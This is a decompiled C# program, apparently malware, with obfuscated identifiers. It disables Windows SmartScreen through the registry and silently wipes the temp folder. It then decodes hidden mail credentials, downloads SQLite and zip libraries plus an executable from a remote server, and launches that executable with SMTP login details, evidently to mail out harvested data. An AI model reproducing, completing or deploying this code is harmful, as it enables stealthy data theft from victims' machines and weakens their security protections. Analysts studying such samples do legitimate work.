using System;
using System.Diagnostics;
using Microsoft.Win32;

namespace samsung
{
	// Token: 0x02000004 RID: 4
	internal static class doma
	{
		// Token: 0x06000007 RID: 7 RVA: 0x000021B4 File Offset: 0x000003B4
		private static ProcessStartInfo xyz()
		{
			return new ProcessStartInfo
			{
				FileName = "cmd.exe",
				Arguments = "/C rd /s /q %temp% ",
				WindowStyle = ProcessWindowStyle.Hidden
			};
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000021E8 File Offset: 0x000003E8
		private static bool ss4545454()
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer", true);
			bool result;
			try
			{
				if (registryKey.GetValue("SmartScreenEnabled") != null)
				{
					registryKey.SetValue("SmartScreenEnabled", "Off");
				}
				registryKey.Close();
				registryKey.Dispose();
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x0000224C File Offset: 0x0000044C
		private static void Main()
		{
			doma.ss4545454();
			if (Process.GetProcessesByName("wsnm").Length > 0)
			{
				return;
			}
			string environmentVariable = Environment.GetEnvironmentVariable("temp");
			new Process
			{
				StartInfo = doma.xyz()
			}.Start();
			environmentVariable + "\\" + Environment.UserName + ".html";
			string str = vgf.cbxfgfbgwes() + ".exe";
			string text = vgf.cbxfgfbgwes();
			string text2 = string.Concat(new object[]
			{
				environmentVariable,
				'\\',
				text,
				'\\'
			});
			string text3 = vgf.tre(afa.mail_otpr35215252);
			string text4 = vgf.tre(afa.mail_pass3525564235);
			string text5 = vgf.tre(afa.mail_polu353653543);
			string text6 = vgf.tre(afa.mail_otpr35215252);
			string text7 = vgf.tre(afa.ssilka526525724);
			text7 = vgf.tre(AMV.DontKillMe(text7)).Replace(':', ';');
			text6 = (text3 = text7.Split(new char[]
			{
				';'
			})[0]);
			text4 = text7.Split(new char[]
			{
				';'
			})[1];
			string text8 = vgf.tre(afa.mail_ru_ru_serv35264235);
			string[] array = new string[]
			{
				text2,
				text2 + "x64\\",
				text2 + "x86\\"
			};
			foreach (string dng in array)
			{
				vgf.fefqeefqf(dng);
			}
			string[] array3 = new string[]
			{
				"x86/SQLite.Interop.dll",
				"x64/SQLite.Interop.dll",
				"System.Data.SQLite.dll",
				"Ionic.Zip.dll"
			};
			foreach (string text9 in array3)
			{
				vgf.gwredngr(text2 + text9, vgf.qrqwer() + "com/" + text9);
			}
			vgf.gwredngr(text2 + str, vgf.qrqwer() + "com/zip");
			string arguments = string.Concat(new object[]
			{
				text8,
				' ',
				afa.mail_ru_ru_port6423464624,
				' ',
				text3,
				' ',
				text4,
				' ',
				text6,
				' ',
				text5,
				' ',
				afa.subject,
				' ',
				afa.budi
			});
			Process.Start(text2 + str, arguments);
		}
	}
}
